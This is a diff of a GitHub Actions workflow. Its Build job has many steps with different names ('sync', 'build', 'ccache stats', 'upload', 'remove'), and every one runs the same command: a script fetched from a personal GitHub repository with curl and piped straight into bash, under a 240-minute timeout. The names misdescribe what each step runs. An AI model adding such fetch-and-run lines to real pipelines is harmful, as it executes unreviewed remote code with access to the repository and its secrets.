@@ -14,16 +14,32 @@ jobs:
       - name: show
         run: cat $GITHUB_WORKSPACE/file.sh
       - name: notify
-        run: curl -Ls https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/notify.sh | bash
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/notify.sh | bash
       - name: test
-        run: curl -Ls https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash
         
   Build:
     name: build
     needs: Test
     runs-on: ubuntu-latest
+    timeout-minutes: 240
     steps:
-      - run: echo I am job 2; date
+      - name: show
+        run: cat $GITHUB_WORKSPACE/file.sh
+      - name: test
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash
+      - name: sync
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash        
+      - name: tsync
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash        
+      - name: build
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash        
+      - name: ccache stats
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash        
+      - name: upload
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash        
+      - name: remove
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash
   Post-Build:
     name: post build
     needs:  Build
